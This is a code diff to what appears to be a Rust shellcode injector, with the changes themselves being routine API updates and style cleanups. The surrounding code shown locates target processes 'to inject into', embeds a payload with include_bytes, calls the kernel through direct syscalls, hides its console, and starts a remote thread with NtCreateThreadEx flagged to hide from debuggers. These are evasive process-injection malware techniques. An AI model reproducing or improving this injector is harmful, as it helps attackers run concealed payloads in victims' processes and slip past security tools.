@@ -1,7 +1,8 @@
 #![windows_subsystem = "windows"]
 #![allow(non_snake_case)]
 
-use sysinfo::{PidExt, ProcessExt, System, SystemExt};
+use sysinfo::System;
+use std::ffi::OsStr;
 use std::include_bytes;
 use rust_syscalls::syscall;
 
@@ -33,11 +34,11 @@ fn boxboxbox(tar: &str) -> Vec<usize> {
     // search for processes to inject into
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
-    for pro in s.processes_by_exact_name(tar) {
+    for pro in s.processes_by_exact_name(OsStr::new(tar)) {
         //println!("{} {}", pro.pid(), pro.name());
         dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
     }
-    return dom;
+    dom
 }
 
 fn enhance(mut buf: Vec<u8>, tar: usize) {
@@ -75,9 +76,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         }
 
         let mut thread_handle : *mut c_void = null_mut();
-        let handle = process_handle as *mut c_void;
-
-        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, THREAD_ALL_ACCESS, NULL, handle, allocstart, NULL, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0 as usize, 0 as usize, 0 as usize, NULL);
+        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, THREAD_ALL_ACCESS, NULL, process_handle, allocstart, NULL, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0_usize, 0_usize, 0_usize, NULL);
 
         if write_status != 0 {
             panic!("Error failed to create remote thread: {:#02X}", write_thread);
@@ -107,7 +106,7 @@ fn main() {
         vec.push(*i);
     }
     let list: Vec<usize> = boxboxbox(tar);
-    if list.len() == 0 {
+    if list.is_empty() {
         panic!("[-] Unable to find a process.")
     } else {
         for i in &list {
